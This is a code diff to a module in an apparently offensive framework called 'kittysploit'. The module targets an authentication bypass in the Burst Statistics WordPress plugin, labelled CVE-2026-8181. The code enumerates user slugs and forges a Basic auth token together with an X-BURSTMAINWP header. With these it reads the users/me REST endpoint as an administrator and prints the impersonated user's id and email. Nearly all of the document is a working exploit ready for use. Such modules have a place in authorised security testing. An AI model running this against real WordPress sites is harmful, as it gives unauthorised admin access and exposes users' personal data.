@@ -5,14 +5,13 @@
 from __future__ import annotations
 
 import base64
-import json
-import re
 
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
+from lib.protocols.http.wordpress import Wordpress
 
 
-class Module(Auxiliary, Http_client):
+class Module(Auxiliary, Http_client, Wordpress):
     __info__ = {
         "name": "Burst Statistics CVE-2026-8181 MainWP auth bypass check",
         "description": "Reads /wp-json/wp/v2/users/me as administrator via X-BURSTMAINWP.",
@@ -22,36 +21,37 @@ class Module(Auxiliary, Http_client):
         "tags": ["wordpress", "burst-statistics", "auth-bypass", "cve-2026-8181"],
     }
 
-    admin_user = OptString("admin", "Administrator slug to impersonate", required=False)
+    def _burst_headers(self, username: str) -> dict:
+        user = (username or "admin").strip()
+        token = base64.b64encode(f"{user}:bypass".encode()).decode()
+        return {
+            "X-BURSTMAINWP": "1",
+            "Authorization": f"Basic {token}",
+        }
 
     def run(self):
-        user = str(self.admin_user or "admin").strip()
-        users = self.http_request(method="GET", path="/wp-json/wp/v2/users", allow_redirects=True)
-        if users and int(users.status_code) == 200:
-            slug_m = re.search(r'"slug"\s*:\s*"([^"]+)"', users.text or "")
-            if slug_m:
-                user = slug_m.group(1)
-        token = base64.b64encode(f"{user}:x".encode()).decode()
-        resp = self.http_request(
-            method="GET",
-            path="/wp-json/wp/v2/users/me?context=edit",
-            headers={
-                "X-BURSTMAINWP": "1",
-                "Authorization": f"Basic {token}",
-            },
-            allow_redirects=True,
-        )
-        if not resp or int(resp.status_code) != 200:
-            print_error("MainWP bypass probe failed")
-            return False
-        try:
-            data = json.loads(resp.text or "")
-        except json.JSONDecodeError:
-            print_error("Non-JSON response")
-            return False
-        roles = data.get("roles") or []
-        if "administrator" not in roles:
-            print_error("Administrator role not returned")
-            return False
-        print_success(f"Impersonated user id={data.get('id')} email={data.get('email')}")
-        return True
+        candidates = ["admin"]
+        candidates.extend(self.wp_enum_user_slugs(self.path))
+        seen = set()
+        for user in candidates:
+            if not user or user in seen:
+                continue
+            seen.add(user)
+            response = self.wp_rest_request(
+                "GET",
+                "/wp/v2/users/me?context=edit",
+                headers=self._burst_headers(user),
+            )
+            if not response:
+                continue
+            try:
+                data = response.json()
+            except Exception:
+                continue
+            if isinstance(data, dict) and "administrator" in (data.get("roles") or []):
+                print_success(
+                    f"Impersonated id={data.get('id')} slug={user} email={data.get('email')}"
+                )
+                return True
+        print_error("MainWP bypass probe failed")
+        return False
